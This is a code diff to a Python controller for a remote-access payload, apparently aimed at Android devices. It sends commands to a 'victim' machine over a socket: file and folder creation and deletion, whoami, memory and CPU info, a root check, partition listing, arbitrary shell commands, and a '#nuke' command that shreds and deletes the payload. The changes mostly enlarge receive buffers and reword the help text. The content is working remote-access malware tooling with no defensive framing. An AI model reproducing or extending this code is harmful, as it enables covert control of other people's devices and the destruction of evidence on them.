@@ -66,38 +66,38 @@ def main(prog_name):
         if cmd[0:5] == 'mkdir':
             cmd = cmd.encode()
             c.send(cmd+and_pwd)
-            output = c.recv(10000)
+            output = c.recv(100000)
             output = raw_converter(output)
             print(output)
         
         elif cmd == 'meminfo':
             c.send(meminfo)
-            output = c.recv(10000)
+            output = c.recv(100000)
             output = raw_converter(output)
             print(output)
         
         elif cmd == 'cpuinfo':
             c.send(cpuinfo)
-            output = c.recv(10000)
+            output = c.recv(100000)
             output = raw_converter(output)
             print(output)
         
         elif cmd == 'crypto':
             c.send(crypto)
-            output = c.recv(10000)
+            output = c.recv(100000)
             output = raw_converter(output)
             print(output)
         
         elif cmd == 'kernel_info':
             cmd = cmd.encode()
             c.send(cmd)
-            ab = c.recv(10000)
+            ab = c.recv(100000)
             ab = raw_converter(ab)
             print(("\n[+] \033[37;1mKernel Version : "+str(ab)))
         
         elif cmd == 'check_root':
             c.send(check_root)
-            a = c.recv(10000)
+            a = c.recv(100000)
             if a == r'\n/system/bin/su\n':
                 print("\n[*] This Device Is Rooted...\n")
             
@@ -111,7 +111,7 @@ def main(prog_name):
         elif cmd == 'check_partitions':
             c.send(check_partitions)
             print('')
-            output = c.recv(100000)
+            output = c.recv(1000000)
             output = raw_converter(output)
             print(output)
         
@@ -127,32 +127,32 @@ rmdir            : Remove Folder On Target
 whoami           : Check Name User Target
 crypto           : Check Encoding On Target
 check_partitions : Check Info Partisi On Target
-#nuke            : Delete the payload from the victim's machine
-#logout          : Close the connection; You need to restart the payload to reconnect!
+#nuke            : Shred and delete the payload from the victim's machine
+#logout          : Close the connection
 """)
 
         elif cmd[0:2] == 'rm':
             cmd = cmd.encode()
             c.send(cmd+and_pwd)
-            output = c.recv(10000)
+            output = c.recv(100000)
             output = raw_converter(output)
         
         elif cmd[0:5] == 'rmdir':
             cmd = cmd.encode()
             c.send(cmd+and_pwd)
-            output = c.recv(10000)
+            output = c.recv(100000)
             output = raw_converter(output)
             print(output)
         
         elif cmd[0:6] == 'whoami':
             c.send(whoami)
-            output = c.recv(10000)
+            output = c.recv(100000)
             output = raw_converter(output)
             print(output)
 
         elif cmd == '#nuke':
             c.send(nuke_it)
-            output = c.recv(10000)
+            output = c.recv(100000)
             output = raw_converter(output)
             print(output)
 
@@ -167,7 +167,7 @@ check_partitions : Check Info Partisi On Target
         else:
             cmd = cmd.encode()
             c.send(cmd)
-            results = c.recv(10000)
+            results = c.recv(100000)
             results = raw_converter(results)
             if results == 'bacod':
                 continue
